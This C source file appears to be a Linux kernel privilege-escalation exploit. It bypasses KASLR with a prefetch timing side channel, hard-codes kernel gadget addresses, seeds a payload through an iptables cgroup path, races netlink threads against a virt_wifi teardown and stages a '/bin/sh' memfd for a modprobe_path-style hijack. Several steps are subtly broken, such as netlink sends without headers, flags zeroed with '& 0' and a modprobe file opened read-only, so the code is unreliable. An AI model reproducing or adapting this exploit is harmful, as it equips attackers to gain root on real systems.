#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/ethtool_netlink.h>
#include <linux/genetlink.h>
#include <linux/if_alg.h>
#include <linux/memfd.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

static uint64_t probe_addr(uintptr_t p)
{
	uint32_t lo0, hi0, lo1, hi1;
	__asm__ volatile(
		"mfence\n\t"
		"lfence\n\t"
		"rdtsc\n\t"
		"mov %%eax, %0\n\t"
		"mov %%edx, %1\n\t"
		"lfence\n\t"
		"prefetchnta (%4)\n\t"
		"mfence\n\t"
		"lfence\n\t"
		"rdtsc\n\t"
		"mov %%eax, %2\n\t"
		"mov %%edx, %3\n\t"
		: "=r"(lo0), "=r"(hi0), "=r"(lo1), "=r"(hi1)
		: "r"(p)
		: "rax", "rdx", "memory");
	return (((uint64_t)hi1 << 32) | lo1) - (((uint64_t)hi0 << 32) | lo0);
}

static uintptr_t find_slide(void)
{
	uintptr_t best = 0xffffffff81000000ULL;
	uint64_t min_dt = UINT64_MAX;
	for (uintptr_t cand = 0xffffffff80000000ULL; cand < 0xffffffffc0000000ULL; cand += 0x200000ULL) {
		uint64_t dt = probe_addr(cand);
		if (dt < min_dt) {
			min_dt = dt;
			best = cand;
		}
	}
	return best - 0xffffffff81000000ULL;
}

static const uintptr_t chain_slots[] = {
	0xffffffff81410211ULL,
	0xffffffff8158a902ULL,
	0xffffffff819904c4ULL,
	0xffffffff81b03318ULL,
	0xffffffff821044e0ULL,
	0xffffffff8244bc10ULL,
	0xffffffff83910280ULL,
	0xffffffff84721100ULL,
};

static void seed_cgroup_buf(uintptr_t s)
{
	uintptr_t target = chain_slots[0] + s;
	char raw[16] = { 0 };
	memcpy(raw, &target, sizeof(target));
	if (fork() == 0) {
		execl("/sbin/iptables", "iptables", "-A", "OUTPUT", "-m", "cgroup", "--path", raw, NULL);
		_exit(1);
	}
}

static void *worker_fn(void *arg)
{
	(void)arg;
	int gs = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	const char *fam = ETHTOOL_GENL_NAME;
	int cmd = ETHTOOL_MSG_FEATURES_SET;
	if (gs >= 0) {
		send(gs, fam, strlen(fam), cmd & 0);
		close(gs);
	}
	return NULL;
}

int main(void)
{
	uintptr_t slide = find_slide();
	int mfd = (int)syscall(SYS_memfd_create, "x", MFD_CLOEXEC);
	dprintf(mfd, "#!/bin/bash\n/bin/sh\n");

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) {
		seed_cgroup_buf(slide);
		int rs = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
		const char *kind = "virt_wifi";
		int del = RTM_DELLINK;
		int sv[2];
		if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) == 0) {
			char slab[3600] = { 0 };
			memcpy(slab, kind, 9);
			send(sv[0], slab, sizeof(slab), del & 0);
		}
		pthread_t th[16];
		for (int i = 0; i < 16; i++)
			pthread_create(&th[i], NULL, worker_fn, NULL);
		for (int i = 0; i < 16; i++)
			pthread_join(th[i], NULL);
		if (rs >= 0)
			close(rs);
	}

	int pfd = open("/proc/sys/kernel/modprobe", O_RDONLY);
	if (pfd >= 0)
		close(pfd);
	int afd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (afd >= 0)
		close(afd);
	return 0;
}
